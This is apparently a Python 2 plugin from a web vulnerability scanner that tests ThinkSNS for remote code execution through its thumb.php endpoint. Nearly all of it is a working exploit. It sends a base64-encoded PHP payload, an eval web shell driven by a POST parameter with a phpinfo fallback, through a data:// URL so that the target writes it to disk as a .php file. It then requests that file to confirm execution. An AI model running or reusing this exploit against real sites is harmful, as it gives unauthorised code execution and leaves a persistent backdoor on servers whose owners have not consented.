#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u'' 
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl1="thumb.php?url=data://text/plain;base64,PD9waHAgaWYoJF9QT1NUW2NdKXtldmFsKCRfUE9TVFtjXSk7fWVsc2V7cGhwaW5mbygpO30/Pg==&w=&t=.php&r=1"
        expurl2="data/thumb/44/ed/44ed1732a7e550e7a8874943fc774bad_100_100_.php"
        exeurl="%s%s"%(url,expurl1)
        requesturl="%s%s"%(url,expurl2)
        res, content = requestUrl(http,exeurl,ob['task_id'],ob['domain_id'])
        r, c = requestUrl(http,requesturl,ob['task_id'],ob['domain_id'])
        if r['status'] == '200' and c.find('<title>phpinfo()</title>')>=0:
            request = getRequest(expurl2)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:thinsnsexecutescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:thinsnsexecutescript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def